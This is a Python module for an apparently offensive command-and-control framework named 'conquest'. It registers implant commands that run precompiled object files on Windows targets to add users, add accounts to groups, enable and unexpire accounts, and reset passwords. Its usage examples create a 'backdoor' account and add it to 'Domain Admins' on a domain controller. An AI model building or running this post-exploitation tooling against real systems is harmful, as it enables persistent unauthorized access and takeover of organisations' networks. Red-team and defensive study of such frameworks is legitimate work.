import conquest 
import os.path

cmd_addUser = ( 
    conquest.createCommand(name="add-user", description="Add a user to a machine.", example="add-user backdoor Password123!",
                           message="Tasked agent to add a user.", mitre=[""])
            .addArgString("username", "Username of the new account.", True)
            .addArgString("password", "Password of the new account.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                username := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/adduser/adduser.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    username,           # Z: Username
                    password,           # Z: Password
                    server,             # Z: Target system
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_addGroupmembership = ( 
    conquest.createCommand(name="add-groupmembership", description="Add a specified user to a group.", example="add-groupmembership CONQUEST\\backdoor \"Domain Admins\" --server dc01",
                           message="Tasked agent to add a user to a group.", mitre=[""])
            .addArgString("user", "Target account in format DOMAIN\\USERNAME. If the user is a local account, only specify the username", True)
            .addArgString("group", "Name of the target group.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                group := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),
                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/addusertogroup/addusertogroup.x64.o",
                params := conquest.bof_pack("ZZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    server,             # Z: Target system
                    username,           # Z: Target user
                    group,              # Z: Target group
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_enableUser = ( 
    conquest.createCommand(name="enable-user", description="Enable a specified user account.", example="enable-user CONQUEST\\user",
                           message="Tasked agent to enable a user.", mitre=[""])
            .addArgString("user", "Target account in format DOMAIN\\USERNAME. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/enableuser/enableuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_unexpireUser = ( 
    conquest.createCommand(name="unexpire-user", description="Unexpire and enable a specified user account.", example="unexpire-user CONQUEST\\user",
                           message="Tasked agent to unexpire a user.", mitre=[""])
            .addArgString("user", "Target account in format DOMAIN\\USERNAME. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/unexpireuser/unexpireuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_setPassword = ( 
    conquest.createCommand(name="set-password", description="Set the password of a target user account.", example="set-password CONQUEST\\user Password123!",
                           message="Tasked agent to set user password.", mitre=[""])
            .addArgString("user", "Target account in format DOMAIN\\USERNAME. If the user is a local account, only specify the username", True)
            .addArgString("password", "New password", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/setpassword/setpassword.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                    password,           # Z: Password
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #


conquest.registerModule(
    name="remote-operations", 
    description="Interact and modify remote Windows systems, services and users.", 
    group="remote-operations", 
    commands=[
        cmd_addUser, cmd_addGroupmembership, cmd_enableUser, cmd_unexpireUser, cmd_setPassword
    ])